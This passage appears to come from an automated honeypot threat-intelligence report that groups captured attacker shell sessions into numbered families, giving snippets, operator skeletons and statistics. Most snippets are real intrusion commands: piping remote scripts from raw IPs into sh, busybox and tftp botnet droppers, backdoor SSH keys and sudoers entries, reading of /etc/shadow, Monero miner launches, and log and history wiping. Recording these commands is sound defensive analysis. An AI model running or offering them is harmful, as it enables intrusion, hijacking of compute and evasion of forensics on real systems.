wget http://2.58.149.116/s -O- | sh || curl http://2.58.149.116/s | sh
sh f ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', '|'), ('sh', '||'), ('curl', '|'), ('sh', ';'), ('sh', 'EOS')]`

Top operators: [('sh', 3), ('wget', 1), ('curl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 37b8c33415c55ab4 | 6d42d895b232 |        2 |               1 |

---

## Family 193

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `3986c18bee07a97d` (Session: `c58eba1499d3`, n_rows=21)

**Medoid Execution Snippet:**
```text
uname -a
id;cat /etc/shadow /etc/passwd
lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
chsh -s /bin/sh daemon
echo Password123 |passwd daemon --stdin
chattr -ia /root/.ssh/*;wget http://sos.vivi.sg/ns1.jpg -O ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
wget -qO - http://sos. ...
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('id', ';'), ('cat', ';'), ('lscpu', ';'), ('echo', ';'), ('chsh', ';'), ('echo', '|'), ('passwd', ';'), ('chattr', ';'), ('wget', ';'), ('chmod', ';'), ('wget', '|'), ('perl', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('mv', ';'), ('PH_EXEC_2', ';'), ('rm', ';'), ('mkdir', ';'), ('cp', ';'), ('chown', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('rm', 'EOS')]`

Top operators: [('chmod', 6), ('wget', 4), ('echo', 2), ('rm', 2), ('PH_EXEC_3', 2), ('uname', 1), ('id', 1), ('cat', 1), ('lscpu', 1), ('chsh', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3986c18bee07a97d | c58eba1499d3 |       21 |               1 |

---

## Family 283

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `3a125b11a3d95771` (Session: `1acb77e90997`, n_rows=1)

**Medoid Execution Snippet:**
```text
payload ;
```

**Consensus Skeleton (op, conn pairs):**
`[('payload', 'EOS')]`

Top operators: [('payload', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3a125b11a3d95771 | 1acb77e90997 |        1 |               1 |

---

## Family 298

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `3ce37e28211227e8` (Session: `23cfc9937f14`, n_rows=11)

**Medoid Execution Snippet:**
```text
sh
shell
cd /tmp
busybox wget http://94.26.236.162/g1.sh || wget http://94.26.236.162/g1.sh
chmod +x g1.sh
./g1.sh
rm -rf g1.sh
tftp -r tftp -g 94.26.236.162
chmod +x tftp
./tftp
rm -rf tftp ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('cd', ';'), ('busybox', '||'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('rm', 'EOS')]`

Top operators: [('chmod', 2), ('rm', 2), ('sh', 1), ('shell', 1), ('cd', 1), ('busybox', 1), ('wget', 1), ('PH_EXEC_1', 1), ('tftp', 1), ('PH_EXEC_2', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3ce37e28211227e8 | 23cfc9937f14 |       11 |               1 |

---

## Family 281

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `3d88b1a23e1c93e6` (Session: `103b32038e3b`, n_rows=9)

**Medoid Execution Snippet:**
```text
sh
shell
ls /
cd /bin/busybox
wget http://179.61.251.240/beastmode/b3astmode.x86
rm-rf busybox
cat b3astmode.x86 > busybox
rm -rf b3astmode.x86
chmod 777 *;./busybox ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('ls', ';'), ('cd', ';'), ('wget', ';'), ('rm-rf', ';'), ('cat', ';'), ('rm', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]`

Top operators: [('sh', 1), ('shell', 1), ('ls', 1), ('cd', 1), ('wget', 1), ('rm-rf', 1), ('cat', 1), ('rm', 1), ('chmod', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3d88b1a23e1c93e6 | 103b32038e3b |        9 |               1 |

---

## Family 269

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `3e1ade867140dc0c` (Session: `bf7ef7e6219a`, n_rows=66)

**Medoid Execution Snippet:**
```text
shell
sh
enable
cd /tmp
cd /dev
cd /mnt
cd /var
rm -rf sh
wget http://37.0.11.168/sh || curl -O http://37.0.11.168/sh || tftp 37.0.11.168 -c get sh || tftp -g -r sh 37.0.11.168
chmod 777 sh;./sh root
rm -rf sh
echo rootsenpai
cd /tmp
cd /dev
cd /mnt
cd /var
rm -rf gay
rm -rf mioriloli
cat /proc/cpui ...
```

**Consensus Skeleton (op, conn pairs):**
`[('shell', ';'), ('sh', ';'), ('enable', ';'), ('cd', ';'), ('cd', ';'), ('cd', ';'), ('cd', ';'), ('rm', ';'), ('wget', '||'), ('curl', '||'), ('tftp', '||'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('echo', ';'), ('cd', ';'), ('cd', ';'), ('cd', ';'), ('cd', ';'), ('rm', ';'), ('rm', ';'), ('cat', '|'), ('grep', ';'), ('uname', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('rm', ';'), ('rm', 'EOS')]`

Top operators: [('echo', 43), ('cd', 8), ('rm', 6), ('chmod', 3), ('tftp', 2), ('shell', 1), ('sh', 1), ('enable', 1), ('wget', 1), ('curl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3e1ade867140dc0c | bf7ef7e6219a |       66 |               1 |

---

## Family 274

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `3e35f922259457d3` (Session: `7b246ac2f888`, n_rows=18)

**Medoid Execution Snippet:**
```text
cd ~
chattr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvc ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('Enter', ';'), ('echo', '|'), ('passwd', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('uname', ';'), ('whoami', ';'), ('lscpu', '|'), ('grep', ';'), ('df', '|'), ('head', '|'), ('awk', 'EOS')]`

Top operators: [('cd', 3), ('echo', 3), ('grep', 3), ('passwd', 2), ('awk', 2), ('uname', 2), ('chattr', 1), ('lockr', 1), ('rm', 1), ('mkdir', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3e35f922259457d3 | 7b246ac2f888 |       18 |               1 |

---

## Family 267

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `3edd5be95cc2911f` (Session: `806667d40aed`, n_rows=27)

**Medoid Execution Snippet:**
```text
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
history -n
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
rm -rf /var/log/wtmp
rm -rf /var/log/lastlog
rm -rf /var/log/secure
rm -rf /var/log/xferlog
rm -rf /var/log/messages
rm -rf /var/run/utmp
touch /var/run/utmp
to ...
```

**Consensus Skeleton (op, conn pairs):**
`[('unset', ';'), ('history', ';'), ('export', ';'), ('export', ';'), ('export', ';'), ('rm', ';'), ('rm', ';'), ('rm', ';'), ('rm', ';'), ('rm', ';'), ('rm', ';'), ('touch', ';'), ('touch', ';'), ('touch', ';'), ('touch', ';'), ('touch', ';'), ('touch', ';'), ('touch', ';'), ('rm', ';'), ('touch', ';'), ('rm', ';'), ('touch', ';'), ('history', ';'), ('uname', ';'), ('free', ';'), ('ps', ';'), ('cat', 'EOS')]`

Top operators: [('touch', 9), ('rm', 8), ('export', 3), ('history', 2), ('unset', 1), ('uname', 1), ('free', 1), ('ps', 1), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3edd5be95cc2911f | 806667d40aed |       27 |               1 |

---

## Family 271

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `4017bd07982cf675` (Session: `8a278db2732f`, n_rows=1)

**Medoid Execution Snippet:**
```text
uptime ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uptime', 'EOS')]`

Top operators: [('uptime', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4017bd07982cf675 | 8a278db2732f |        1 |               1 |

---

## Family 331

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `42c4e1b7adf4c5bc` (Session: `9d9456e9819d`, n_rows=11)

**Medoid Execution Snippet:**
```text
nproc
pwd
ps -x
ls -a
cd .ca
ls- a
mkdir .cache
cd .cache/
sudo su -
hist-c
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('nproc', ';'), ('pwd', ';'), ('ps', ';'), ('ls', ';'), ('cd', ';'), ('ls-', ';'), ('mkdir', ';'), ('cd', ';'), ('sudo', ';'), ('hist-c', ';'), ('history', 'EOS')]`

Top operators: [('cd', 2), ('nproc', 1), ('pwd', 1), ('ps', 1), ('ls', 1), ('ls-', 1), ('mkdir', 1), ('sudo', 1), ('hist-c', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 42c4e1b7adf4c5bc | 9d9456e9819d |       11 |               1 |

---

## Family 350

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `4486d4f9df198637` (Session: `a504932224b9`, n_rows=4)

**Medoid Execution Snippet:**
```text
cat /etc/issue
wget http://107.182.129.239/x-8.6-.Fourloko chmod 777 *
./x-8.6-.Fourloko
rm -rf * ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('wget', ';'), ('PH_EXEC_1', ';'), ('rm', 'EOS')]`

Top operators: [('cat', 1), ('wget', 1), ('PH_EXEC_1', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4486d4f9df198637 | a504932224b9 |        4 |               1 |

---

## Family 260

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `44c889c40e4095cb` (Session: `df8b7a87713c`, n_rows=3)

**Medoid Execution Snippet:**
```text
User-Agent: 'Cloud mapping experiment. Contact research@pdrlabs.net'
Accept: */*
Accept-Encoding: gzip ;
```

**Consensus Skeleton (op, conn pairs):**
`[('User-Agent:', ';'), ('Accept:', ';'), ('Accept-Encoding:', 'EOS')]`

Top operators: [('User-Agent:', 1), ('Accept:', 1), ('Accept-Encoding:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 44c889c40e4095cb | df8b7a87713c |        3 |               1 |

---

## Family 337

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `451533492c3eede8` (Session: `43470e9ee0ea`, n_rows=1)

**Medoid Execution Snippet:**
```text
wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 8BHQUunQHax1XjPonUxPKk1H4EKP6SdXnMtyyY5W9Bts7qM7uq5XsjjXiPj1zacMGP8chCv4cumYZRYfH5cUBGshKy1gssW -k --tls --rig-id Main && rm -rf * ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', '&&'), ('chmod', '&&'), ('PH_EXEC_1', '&&'), ('rm', 'EOS')]`

Top operators: [('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 451533492c3eede8 | 43470e9ee0ea |        1 |               1 |

---

## Family 330

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `455dae7f3290d937` (Session: `3cf1359e5102`, n_rows=2)

**Medoid Execution Snippet:**
```text
Accept: application/sdp
Content-Length: 0 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('Accept:', ';'), ('Content-Length:', 'EOS')]`

Top operators: [('Accept:', 1), ('Content-Length:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 455dae7f3290d937 | 3cf1359e5102 |        2 |               1 |

---

## Family 233

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `4578b5ccc963062f` (Session: `964157890fc3`, n_rows=8)

**Medoid Execution Snippet:**
```text
rm -rf cnrig
pkill cnrig
wget nasapaul.com/cnrig
chmod +x *
./cnrig --donate-level 1 -o pool.supportxmr.com:443 -u 87Fxj6UDiwYchWbn2k1mCZJxRxBC5TkLJQoP9EJ4E9V843Z9ySeKYi165Gfc2KjxZnKdxCkz7GKrvXkHE11bvBhD9dbMgQe -p tencent -k --tls -B
mv cnrig /var/tmp/SSH-1231HFD3831H2NDSIDNA
rm -rf .bash_history
hi ...
```

**Consensus Skeleton (op, conn pairs):**
`[('rm', ';'), ('kill', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('mv', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('rm', 2), ('kill', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('mv', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4578b5ccc963062f | 964157890fc3 |        8 |               1 |

---

## Family 217

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `460ebc8adbd2a246` (Session: `9b884d97dfd1`, n_rows=6)

**Medoid Execution Snippet:**
```text
echo -e '\x67\x61\x79\x66\x67\x74'
enable
shell
sh
ping
sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', ';'), ('enable', ';'), ('shell', ';'), ('sh', ';'), ('ping', ';'), ('sh', 'EOS')]`

Top operators: [('sh', 2), ('echo', 1), ('enable', 1), ('shell', 1), ('ping', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 460ebc8adbd2a246 | 9b884d97dfd1 |        6 |               1 |

---

## Family 227

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `497fd3182e3c5b65` (Session: `a94251e05a74`, n_rows=7)

**Medoid Execution Snippet:**
```text
set +o history && history -c
nproc
cd /tmp
wget -qO - ftp://159.203.75.165/.mu | perl ;wget ftp://159.203.75.165/miner.sh
bash miner.sh
rm -rf /tmp/miner.sh*
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('set', '&&'), ('history', ';'), ('nproc', ';'), ('cd', ';'), ('wget', '|'), ('perl', ';'), ('wget', ';'), ('bash', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('history', 2), ('wget', 2), ('set', 1), ('nproc', 1), ('cd', 1), ('perl', 1), ('bash', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 497fd3182e3c5b65 | a94251e05a74 |        7 |               1 |

---

## Family 207

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `49c69feeed3cad7e` (Session: `f7afbf664fc4`, n_rows=31)

**Medoid Execution Snippet:**
```text
cd /tmp
wget http://45.139.105.145/bins/x86
chmod 777 x86;./x86 Routers
rm -rf x86
wget http://45.139.105.145/bins/mips
chmod 777 mips;./mips Routers
rm -rf mips
wget http://45.139.105.145/bins/mpsl
chmod 777 mpsl;./mpsl Routers
rm -rf mpsl
wget http://45.139.105.145/bins/arm
chmod 777 arm;./arm Rou ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_4', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_5', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_6', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_7', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_8', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_9', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_10', ';'), ('rm', 'EOS')]`

Top operators: [('wget', 10), ('chmod', 10), ('rm', 10), ('cd', 1), ('PH_EXEC_1', 1), ('PH_EXEC_2', 1), ('PH_EXEC_3', 1), ('PH_EXEC_4', 1), ('PH_EXEC_5', 1), ('PH_EXEC_6', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 49c69feeed3cad7e | f7afbf664fc4 |       31 |               1 |

---

## Family 211

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `49edaafd510b3f1c` (Session: `0e19edc7a23b`, n_rows=13)

**Medoid Execution Snippet:**
```text
ls
perl
ls
ps x
top
nproc
ls
ls -la
wget
ftp
ps x
w
exit ;
```

**Consensus Skeleton (op, conn pairs):**
`[('ls', ';'), ('perl', ';'), ('ls', ';'), ('ps', ';'), ('top', ';'), ('nproc', ';'), ('ls', ';'), ('ls', ';'), ('wget', ';'), ('ftp', ';'), ('ps', ';'), ('w', ';'), ('exit', 'EOS')]`

Top operators: [('ls', 4), ('ps', 2), ('perl', 1), ('top', 1), ('nproc', 1), ('wget', 1), ('ftp', 1), ('w', 1), ('exit', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 49edaafd510b3f1c | 0e19edc7a23b |       13 |               1 |

---

## Family 259

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `4a22e188bce207ca` (Session: `6af70760aa59`, n_rows=3)

**Medoid Execution Snippet:**
```text
HELP
EHLO 3133302e3139322e3136362e313234.net
? ;
```

**Consensus Skeleton (op, conn pairs):**
`[('HELP', ';'), ('EHLO', ';'), ('?', 'EOS')]`

Top operators: [('HELP', 1), ('EHLO', 1), ('?', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4a22e188bce207ca | 6af70760aa59 |        3 |               1 |

---

## Family 291

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `4c6553767593f50a` (Session: `9b05468aa85d`, n_rows=4)

**Medoid Execution Snippet:**
```text
shell
system
enable
busybox ;
```

**Consensus Skeleton (op, conn pairs):**
`[('shell', ';'), ('system', ';'), ('enable', ';'), ('busybox', 'EOS')]`

Top operators: [('shell', 1), ('system', 1), ('enable', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4c6553767593f50a | 9b05468aa85d |        4 |               1 |

---

## Family 275

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `4f0f46d5da5fd3de` (Session: `270fe5548ed2`, n_rows=4)

**Medoid Execution Snippet:**
```text
sh
shell
help
busybox ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('help', ';'), ('busybox', 'EOS')]`

Top operators: [('sh', 1), ('shell', 1), ('help', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4f0f46d5da5fd3de | 270fe5548ed2 |        4 |               1 |

---

## Family 343

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `50dbee89176a0139` (Session: `5f351ccdd404`, n_rows=4)

**Medoid Execution Snippet:**
```text
/ip cloud print
ifconfig
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
echo Hi | cat -n ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('ifconfig', ';'), ('ls', ';'), ('echo', '|'), ('cat', 'EOS')]`

Top operators: [('PH_EXEC_1', 1), ('ifconfig', 1), ('ls', 1), ('echo', 1), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 50dbee89176a0139 | 5f351ccdd404 |        4 |               1 |

---

## Family 173

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `511c68f50306330f` (Session: `adc55adcc8ab`, n_rows=6)

**Medoid Execution Snippet:**
```text
/bin/sh -c 'LANG=C
LC_ALL=C
id'
LANG=C
LC_ALL=C
id ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('id', 'EOS')]`

Top operators: [('sh', 1), ('id', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 511c68f50306330f | adc55adcc8ab |        6 |               1 |

---

## Family 145

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `514e4f9dfe7ef5b0` (Session: `17d93b9017b6`, n_rows=2)

**Medoid Execution Snippet:**
```text
enable
busybox ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('busybox', 'EOS')]`

Top operators: [('enable', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 514e4f9dfe7ef5b0 | 17d93b9017b6 |        2 |               1 |

---

## Family 107

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `557c29151269aca2` (Session: `9ff1b4bad7a8`, n_rows=7)

**Medoid Execution Snippet:**
```text
uname -a
cat /proc/cpuinfo
free -m
dmidecode | grep Vendor | head -n 1
ps -x
dmesg | grep irtual
lspci | grep irti ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('cat', ';'), ('free', ';'), ('dmidecode', '|'), ('grep', '|'), ('head', ';'), ('ps', ';'), ('dmesg', '|'), ('grep', ';'), ('lspci', '|'), ('grep', 'EOS')]`

Top operators: [('grep', 3), ('uname', 1), ('cat', 1), ('free', 1), ('dmidecode', 1), ('head', 1), ('ps', 1), ('dmesg', 1), ('lspci', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 557c29151269aca2 | 9ff1b4bad7a8 |        7 |               1 |

---

## Family 333

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `5717b6f2abdaf4d2` (Session: `549a9003d69a`, n_rows=6)

**Medoid Execution Snippet:**
```text
sh
wget
/bin/busybox
echo -e '\147\141\171\146\147\164'
gayfgtmulti-callREPOR/bin/busybox
echo -e '\147\141\171\146\147\164' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('wget', ';'), ('busybox', ';'), ('echo', ';'), ('PH_EXEC_1', ';'), ('echo', 'EOS')]`

Top operators: [('echo', 2), ('sh', 1), ('wget', 1), ('busybox', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5717b6f2abdaf4d2 | 549a9003d69a |        6 |               1 |

---

## Family 319

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `5b9000e455933318` (Session: `f92481f2ba29`, n_rows=223)

**Medoid Execution Snippet:**
```text
enable
development
system
shell
sh
runshellcmd
linuxshell
runshellcmd
start start-shell
start-shell
start-shell bash
ping
sh
vshell
exec shellconfig
config terminal
busybox DNXFCOW
/bin/busybox DNXFCOW
/bin/busybox DNXFCOW
>/tmp/.file && cd /tmp/
>/var/.file && cd /var/
>/dev/.file && cd /dev/
>/mnt ...
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('development', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('runshellcmd', ';'), ('linuxshell', ';'), ('runshellcmd', ';'), ('start', ';'), ('start-shell', ';'), ('start-shell', ';'), ('ping', ';'), ('sh', ';'), ('vshell', ';'), ('exec', ';'), ('config', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', 